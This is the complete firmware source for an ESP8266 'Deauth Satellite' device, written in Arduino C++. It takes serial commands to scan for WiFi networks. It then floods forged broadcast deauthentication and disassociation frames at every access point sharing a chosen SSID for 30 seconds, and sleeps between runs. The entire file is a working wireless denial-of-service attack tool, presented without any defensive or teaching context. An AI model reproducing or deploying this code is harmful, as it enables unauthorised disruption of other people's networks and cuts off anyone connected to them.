#include <ESP8266WiFi.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// Global state variables
bool inDeepSleep = true;

String serialBuffer = "";

struct WiFiNetwork {
  char ssid[33];
  char bssid[18];
  int rssi;
  uint8_t channel;
  uint8_t mac[6];
};

#define MAX_NETWORKS 20
WiFiNetwork networks[MAX_NETWORKS];
int networkCount = 0;

uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Seq
    0x07, 0x00                          // Reason
};

String currentSSID = "";
String currentMode = "SINGLE";
String selectedSSID = "";

void setup() {
  Serial.begin(115200);
  delay(500);
  
  Serial.println("\n\n=== ESP8266 Deauth Satellite (v2.0.0) ===");
  
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  
  // Check reset reason (simplified for ESP8266)
  rst_info *rInfo = ESP.getResetInfoPtr();
  Serial.println("Boot reason: " + String(rInfo->reason));
  
  // If woken from deep sleep, continue
  // Otherwise go to deep sleep
  if (rInfo->reason == REASON_DEEP_SLEEP_AWAKE) {
    Serial.println("Woke from deep sleep");
    inDeepSleep = false;
  } else {
    Serial.println("Cold boot - entering deep sleep");
    enterDeepSleep();
  }
}

void loop() {
  handleSerialInput();
  
  if (inDeepSleep) {
    // Should not reach here
    delay(1000);
  }
}

void handleSerialInput() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n') {
      processCommand(serialBuffer);
      serialBuffer = "";
    } else if (c != '\r') {
      serialBuffer += c;
    }
  }
}

void processCommand(String cmd) {
  Serial.println("CMD: " + cmd);
  
  if (cmd == "WAKE") {
    Serial.println("Waking up!");
    inDeepSleep = false;
  }
  else if (cmd == "SCAN") {
    scanNetworks();
  }
  else if (cmd.startsWith("DEAUTH:")) {
    // DEAUTH:SSID:MODE
    int firstColon = cmd.indexOf(':');
    int secondColon = cmd.indexOf(':', firstColon + 1);
    
    selectedSSID = cmd.substring(firstColon + 1, secondColon);
    currentMode = cmd.substring(secondColon + 1);
    
    Serial.println("Starting deauth attack");
    Serial.println("SSID: " + selectedSSID);
    Serial.println("Mode: " + currentMode);
    
    startDeauthAttack();
  }
  else if (cmd == "STOP") {
    Serial.println("Stopping attack");
    stopDeauthAttack();
    enterDeepSleep();
  }
}

void scanNetworks() {
  Serial.println("Scanning networks...");
  
  wifi_promiscuous_enable(0);
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks(false);
  networkCount = 0;
  
  if (n == 0) {
    Serial.println("NETWORKS:");
    return;
  }
  
  // Extract unique SSIDs
  String uniqueSSIDs[MAX_NETWORKS];
  int uniqueCount = 0;
  
  for (int i = 0; i < n && networkCount < MAX_NETWORKS; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "[Hidden]";
    
    bool isUnique = true;
    for (int j = 0; j < uniqueCount; j++) {
      if (uniqueSSIDs[j] == ssid) {
        isUnique = false;
        break;
      }
    }
    
    if (isUnique && uniqueCount < MAX_NETWORKS) {
      uniqueSSIDs[uniqueCount] = ssid;
      uniqueCount++;
    }
  }
  
  // Send unique network list
  String response = "NETWORKS:";
  for (int i = 0; i < uniqueCount; i++) {
    response += uniqueSSIDs[i];
    if (i < uniqueCount - 1) response += ",";
  }
  Serial.println(response);
  
  WiFi.scanDelete();
}

void startDeauthAttack() {
  // Rescan to get all networks
  wifi_promiscuous_enable(0);
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks(false);
  
  // Find all networks with matching SSID
  struct {
    uint8_t bssid[6];
    int channel;
  } targetNetworks[MAX_NETWORKS];
  
  int targetCount = 0;
  
  for (int i = 0; i < n && targetCount < MAX_NETWORKS; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "[Hidden]";
    
    if (ssid == selectedSSID) {
      memcpy(targetNetworks[targetCount].bssid, WiFi.BSSID(i), 6);
      targetNetworks[targetCount].channel = WiFi.channel(i);
      targetCount++;
      
      Serial.println("Target: " + String(WiFi.BSSIDstr(i)) + " on channel " + WiFi.channel(i));
    }
  }
  
  WiFi.scanDelete();
  
  if (targetCount == 0) {
    Serial.println("No networks found");
    Serial.println("DEAUTH_DONE");
    return;
  }
  
  // Send deauth packets
  Serial.println("DEAUTH_START");
  
  wifi_promiscuous_enable(1);
  
  unsigned long attackDuration = 30000; // 30 seconds
  unsigned long attackStart = millis();
  uint16_t seq = 0;
  
  while (millis() - attackStart < attackDuration) {
    if (Serial.available()) {
      String cmd = Serial.readStringUntil('\n');
      cmd.trim();
      if (cmd == "STOP") {
        break;
      }
    }
    
    for (int k = 0; k < targetCount; k++) {
      // Set channel
      wifi_set_channel(targetNetworks[k].channel);
      delay(2);
      
      // Prepare deauth packet
      memcpy(&deauthPacket[10], targetNetworks[k].bssid, 6);
      memcpy(&deauthPacket[16], targetNetworks[k].bssid, 6);
      
      seq++;
      deauthPacket[22] = (seq << 4) & 0xFF;
      deauthPacket[23] = (seq >> 4) & 0xFF;
      
      deauthPacket[0] = 0xC0;
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      
      deauthPacket[0] = 0xA0;
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      
      yield();
    }
    
    delay(10);
  }
  
  wifi_promiscuous_enable(0);
  Serial.println("DEAUTH_DONE");
  
  // Return to sleep
  delay(1000);
  enterDeepSleep();
}

void stopDeauthAttack() {
  wifi_promiscuous_enable(0);
  Serial.println("Attack stopped");
}

void enterDeepSleep() {
  Serial.println("Entering deep sleep...");
  delay(100);
  
  inDeepSleep = true;
  
  ESP.deepSleep(0); // Sleep indefinitely
}
